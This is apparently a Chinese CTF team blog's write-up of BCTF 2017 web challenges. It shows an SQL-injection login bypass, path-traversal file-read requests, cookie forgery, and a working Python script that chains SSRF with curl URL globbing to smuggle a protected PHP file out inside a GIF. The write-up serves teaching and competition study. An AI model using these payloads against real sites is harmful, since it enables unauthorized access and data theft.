<!DOCTYPE html>
<html lang="zh">
<head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>BCTF 2017 Web 题目总结</title>
        <link rel="stylesheet" href="https://phuker.github.io/theme/css/main.css" />

        <script type="text/javascript" src="https://phuker.github.io/theme/js/jquery-3.2.0.min.js"></script>
        <script type="text/javascript" src="https://phuker.github.io/theme/js/cav.js"></script>
        <script type="text/javascript" src="https://phuker.github.io/theme/js/qqmain.js"></script>

        <!--[if IE]>
            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="https://phuker.github.io/#">Phuker  <strong>Phuker @ Blue-Whale Team</strong> </a></h1>
                <nav><ul>
                    <li><a href="/#">Home</a></li>
                    <li><a href="https://phuker.github.io/category/about.html">About</a></li>
                    <li><a href="https://phuker.github.io/category/misc.html">Misc</a></li>
                    <li class="active"><a href="https://phuker.github.io/category/web.html">Web</a></li>
                </ul>
                </nav>
        </header><!-- /#banner -->
<section id="content" class="body">
  <article>
    <header>
      <h1 class="entry-title">
        <a href="https://phuker.github.io/bctf2017-web.html" rel="bookmark"
           title="Permalink to BCTF 2017 Web 题目总结">BCTF 2017 Web 题目总结</a></h1>
    </header>

    <div class="entry-content">
<footer class="post-info">
        <span>2017-04-19 周三</span>
        	<span>| by <a class="url fn" href="https://phuker.github.io/author/admin.html">admin</a></span>
<span>| tags: <a href="https://phuker.github.io/tag/ctf.html">CTF</a><a href="https://phuker.github.io/tag/web.html">web</a></span>
</footer><!-- /.post-info -->      <p>毕竟还是图样图森破，这次比赛最后我们只做出来了一部分题目，很可惜火日菊苣出的两道题目都没做出来。 <br>
<img alt="捂脸" src="images/say-more-all-tears.jpg" style="height:8em">   </p>
<h1>Baby Sqli/ Kitty Shop/ Reverse: Flag Shop</h1>
<p>这也是一套略显莫名其妙的题目。  </p>
<h2>Baby Sqli</h2>
<p>这次比赛大有 Web、Reverse、Crypto结合的意思？<br>
首先是Baby Sqli，这题首先有一个登录页面，有WAF，username没有过滤<code>'</code>。测了一堆Payload发现<code>username</code>是<code>admin'#</code>，<code>password</code>随意，可以成功登录。<br>
然后有个商店可以买东西，manual说有<code>a b c</code>三种商品。但是下面的提示却是<code>4 items in stock but one is available!</code>。于是队友买了<code>d</code>，拿到flag。  </p>
<div class="highlight"><pre><span></span>Welcome to the shop! Your balance is $10, have fun~

  (a) hello kitty                   $10
  (b) flag of hello kitty           $10
  (c) flag of dummy shop            $999
</pre></div>


<h2>Kitty Shop</h2>
<p>然后一个队友扫描到了 <code>.viminfo</code> 文件：</p>
<div class="highlight"><pre><span></span># This viminfo file was generated by Vim 7.4.
# You may edit it if you&#39;re careful!

# Value of &#39;encoding&#39; when this file was written
*encoding=utf-8

# File marks:
&#39;0  1  0  ~/.viminfo
&#39;1  99  0  ~/app/encrypt0p@ssword/password
</pre></div>


<p><code>load.php</code>用来下载<code>manual</code>文件，但是存在任意文件读取漏洞，但是屏蔽了一些关键词：<code>.php</code>，<code>proc</code>，<code>php://</code>等。结合有一个Reverse题也是这个网站，猜测需要下载一个二进制文件，于是顺藤摸瓜下载：  </p>
<div class="highlight"><pre><span></span>POST /load.php

kitty=../.viminfo
kitty=../encrypt0p@ssword/password
kitty=../../../../../../backup/client.zip
</pre></div>


<p>然后直接运行这个client，wireshark抓包就能看到flag。  </p>
<h2>Reverse: Flag Shop</h2>
<p>通过逆向这个client，里面有一个签名算法，很显然然后要伪造自己的钱然后买<code>c</code>。可惜此题最后也无人解出。  </p>
<h1>admin only</h1>
<p>这道题是最莫名其妙的题目，有“为出题而出题”的嫌疑。<br>
首先确定不是 GitHub Pages 静态页面；在GitHub里面搜索没有发现这个repository。然后看题目，里面有个登录页面，能拿到<code>md5(admin的password)</code>。反查md5，登录进去并没有GitHub的信息，突然发现里面有个<code>identity</code> Cookie，是 <code>md5('user')</code>，改成 <code>md5('admin')</code> 就显示了一个GitHub账号。<br>
找到 repository 里面有一个apk文件，简单逆向一下，有一个AES 加密后的字符串、加密算法、密钥，解开就是flag。  </p>
<h1>Alice and Bob</h1>
<p><a href="https://phuker.github.io/sqli-bit-dump.html" target="_blank">见这篇博客</a></p>
<h1>Paint</h1>
<p>这是一道很有意思的题目。比赛的时候已经能SSRF读取 <code>flag.php</code>，但是不能通过图片检验。后来看了<a href="http://www.bendawang.site/article/BCTF-2017-WEB-WriteUp" target="_blank">这篇</a>和<a href="http://lorexxar.cn/2017/04/18/bctf2017-web/" target="_blank">这篇</a>博客，才知道curl有trick。<br>
首先是一道自带<a href="http://music.163.com/#/m/song?id=21994242" target="_blank">BGM</a>的题目。内容是一个画板，前端的部分随便玩两下就行了，不必仔细看。查看我一开始的笔记可以发现，网站的逻辑发生了变化，这里按最新版本处理。另外，网站一开始还有别的功能，后来删掉了多余的功能，能搞事情的地方只剩下：  </p>
<h2>文件上传 upload.php</h2>
<p>可以上传的扩展名是： <code>jpg png gif</code>， 禁止的是： <code>bmp php</code> 等。上传完毕会经过图像处理<code>gd</code>库的检验和处理，然后修改文件名，保存在 <code>/uploads/</code> 里面。文件名的扩展名取自上传的 <code>filename</code> ，不需要和实际类型匹配，只需要是正常的图片。测试随机写的扩展名，返回<code>{"files":{"error":"Filename invalid"}}</code>，说明扩展名这里是白名单限制。<br>
在上传过程中，服务端检查扩展名是强制的，但是 <code>gd</code> 检验处理图片似乎不是强制性的（可能忽略了报错），如果上传一个不是图片的文件仍然可以保存。</p>
<p>另外看了<a href="http://lorexxar.cn/2017/04/18/bctf2017-web/" target="_blank">这篇博客</a>发现，测试这个网站的<code>/uploads</code>可以发现访问任意 <code>.php</code> 都 403 forbidden。所以上传Webshell这条路走不通。经过测试，虽然可以上传包含PHP代码的gif图片，但是没有发现文件包含等漏洞，无法远程命令执行。   </p>
<h2>服务端请求 image.php</h2>
<p>可以请求别的网站的图片，然后经过<code>upload.php</code>类似的检验处理流程，保存在<code>/uploads/</code>。这里强制用gd库检查图片格式，如果不是图片则会拒绝。网络协议方面，只发现了可以使用 <code>http htttps</code> 协议，禁止了<code>ftp file</code> 等协议。尝试请求自己VPS的资源，可以看到<code>User-Agent</code>是<code>curl/7.47.0</code>。  </p>
<div class="highlight"><pre><span></span>52.53.74.187 &quot;-&quot; &quot;-&quot; [15/Apr/2017:18:21:26 +0800] &quot;GET /shell.txt HTTP/1.1&quot; 200 274 &quot;-&quot; &quot;curl/7.47.0&quot;
</pre></div>


<p>当时想到可能是 SSRF 漏洞读取 flag.php。SSRF 本身很好解决，用 <code>127.0.0.2</code> 或者自己搞一个指向 <code>127.0.0.1</code> 的域名访问 <code>/flag.php</code> 即可绕过这一部分的WAF，返回：<code>{"files":{"size":374,"error":"Not Image"}}</code>。直接访问 flag.php，长度则是80。所以这里成功读取到了 flag.php，但是无法通过图片检验。<br>
赛后简单测试了一下，此处过滤了一些字符：  <code>| &lt; &gt; " ' 空格</code> 等。测试 ASCII 0-255 所有字符，没有过滤的只有： <code>! % &amp; ( ) + , - . 数字 = ? @ 大写字母 ^ _ 小写字母</code> ，以及 <code>[ ] { }</code>。仔细观察VPS日志可以发现，后面4种字符虽然并没有显示<code>{"files":{"error":"Invalid URL"}}</code>，而是返回了<code>{"files":{"size":0,"error":"Not Image"}}</code>，但是服务器上并没有看到请求的日志。从这些现象可以猜测：这里用到了curl命令，不能命令注入，但是有不知道的特性。  <br>
查 <code>man curl</code> 以及相关资料，发现 curl 有 <a href="https://ec.haxx.se/cmdline-globbing.html" target="_blank"><code>URL globbing</code></a> 的特性。然后服务端应该是执行了类似 <code>curl 用户URL &gt; xxx</code> 的命令。<br>
那么就有思路了：随便找一张 gif 图片，首先上传再下载让gd库处理一次。然后从中间去掉374个字节分成首尾两个图片，使用curl的这个特性以及 SSRF 漏洞“夹住” flag.php，保存到<code>/uploads/</code>里面。<br>
<img alt="用到的gif图片" src="images/firesun-paint.gif"><br>
另外，分割图片的位置不能太随意。稍有常识的人都会看出，gif 文件的数据区块<code>struct DATASUBBLOCKS DataSubBlocks[N]</code>大小是 255，但是 flag.php 的大小是 374，在这里并不能装下<code>flag.php</code>的所有内容，这会导致 <code>gd</code> 库处理的过程中出现问题。而<code>struct GLOBALCOLORTABLE GlobalColorTable</code>的空间则足够大，可以在这一个区域储存<code>flag.php</code>。</p>
<p>手动抠图效率不高，写一个随机切割图片并上传的脚本：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">org_img</span> <span class="o">=</span> <span class="s1">&#39;firesun-paint.gif&#39;</span>
<span class="n">org_img_content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">org_img</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">org_img_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">org_img_content</span><span class="p">)</span>
<span class="n">flag_size</span> <span class="o">=</span> <span class="mi">374</span>

<span class="n">domain</span> <span class="o">=</span> <span class="s1">&#39;http://paint.bctf.xctf.org.cn/&#39;</span>
<span class="n">upload_url</span> <span class="o">=</span> <span class="s1">&#39;http://paint.bctf.xctf.org.cn/upload.php&#39;</span>
<span class="n">ssrf_url</span> <span class="o">=</span> <span class="s1">&#39;http://paint.bctf.xctf.org.cn/image.php&#39;</span>

<span class="n">flag_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(bctf{.*?})&#39;</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">trying</span><span class="p">():</span>
    <span class="c1">#cut_start = randint(0,org_img_size - 374)</span>
    <span class="n">cut_start</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">)</span>  <span class="c1"># aim &#39;struct GLOBALCOLORTABLE GlobalColorTable&#39;</span>
    <span class="k">print</span> <span class="s1">&#39;Cut image at </span><span class="si">%d</span><span class="s1"> hex=</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">cut_start</span><span class="p">,</span> <span class="n">cut_start</span><span class="p">)</span>

    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;files[]&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;xxxx.gif&#39;</span><span class="p">,</span> <span class="n">org_img_content</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">cut_start</span><span class="p">],</span> <span class="s1">&#39;image/gif&#39;</span><span class="p">)}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
    <span class="n">part1_path</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;files&#39;</span><span class="p">][</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
    <span class="k">print</span> <span class="s1">&#39;part1 upload path is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">part1_path</span>

    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;files[]&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;xxxx.gif&#39;</span><span class="p">,</span> <span class="n">org_img_content</span><span class="p">[</span><span class="n">cut_start</span><span class="o">+</span><span class="n">flag_size</span><span class="p">:],</span> <span class="s1">&#39;image/gif&#39;</span><span class="p">)}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
    <span class="n">part2_path</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;files&#39;</span><span class="p">][</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
    <span class="k">print</span> <span class="s1">&#39;part2 upload path is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">part2_path</span>

    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.2/{</span><span class="si">%s</span><span class="s1">,flag.php,</span><span class="si">%s</span><span class="s1">}&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">part1_path</span><span class="p">,</span> <span class="n">part2_path</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">ssrf_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span><span class="n">url</span><span class="p">})</span>
    <span class="n">flag_path</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;files&#39;</span><span class="p">][</span><span class="s1">&#39;url&#39;</span><span class="p">]</span>
    <span class="k">print</span> <span class="s1">&#39;include flag.php, path is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">flag_path</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">domain</span><span class="o">+</span><span class="n">flag_path</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;result&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span><span class="o">+</span><span class="s1">&#39;.gif&#39;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>

    <span class="k">if</span> <span class="s1">&#39;bctf{&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_regex</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">print</span> <span class="s1">&#39;*** get flag ***&#39;</span>
            <span class="n">flag_filename</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="s1">&#39;.gif&#39;</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">flag_filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
            <span class="k">print</span> <span class="s1">&#39;saved to </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">flag_filename</span>
            <span class="k">print</span> <span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="s1">&#39;flag not complete&#39;</span>


<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">trying</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="s1">&#39;Error&#39;</span>
</pre></div>


<p>运行效果：</p>
<div class="highlight"><pre><span></span>Cut image at 682 hex=2aa
part1 upload path is uploads/14925990976o5M2s8w.gif
part2 upload path is uploads/1492599098PeFob7yg.gif
Error
Cut image at 27 hex=1b
part1 upload path is uploads/1492599099kMnBDrak.gif
part2 upload path is uploads/1492599099kJDI9YTX.gif
include flag.php, path is uploads/1492599099sYN4QHLf.gif
*** get flag ***
saved to flag1492599092.77.gif
bctf{G073Q1o0Bm4fWKj8iE5TGdb9JBkbnPzh}
</pre></div>


<h2>赛后感想</h2>
<p>比赛的时候不知道 curl 的这个 URL globbing 特性，另外也没有好好检测 image.php 的过滤情况，如果发现了 <code>{ }</code> 这些字符的异常，是有希望顺藤摸瓜查到这个特性，然后解出这道题的。</p>
<h1>Diary</h1>
<p>显然这是一道 XSS 的题。由于我对 XSS 一无所知，比赛的时候并没有仔细看题，现在题目服务器关了，暂时略去。</p>
<h1>signature</h1>
<p>同理，略。  </p>
    </div><!-- /.entry-content -->
    <p></p>
    <br />
    <br />
    <hr style="border: 1px solid #EEEEEE;" />
    <p>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）<p>
    <br />
    <div class="comments">
      <h2>Comments</h2>
      <div id="disqus_thread"></div>
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = "https://phuker.github.io/bctf2017-web.html";
          this.page.identifier = "bctf2017-web.html"; 
        };
        (function() { // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        s.src = 'https://phuker.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
        })();
      </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

    </div>

  </article>
</section>
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>blogroll</h2>
                        <ul>
                            <li><a href="http://blue-whale.me" target="_blank">Blue-Whale Team</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>

                            <li><a href="https://github.com/phuker" target="_blank">GitHub</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <p>Powered by <a href="http://getpelican.com/" target="_blank">Pelican</a>. Theme <a href="https://github.com/blueicefield/pelican-blueidea/" target="_blank">blueidea</a>, inspired by the default theme. Modified by Blue-Whale Team.</p>
        </footer><!-- /#contentinfo -->

<script id="dsq-count-scr" src="//phuker.disqus.com/count.js" async></script>
</body>
</html>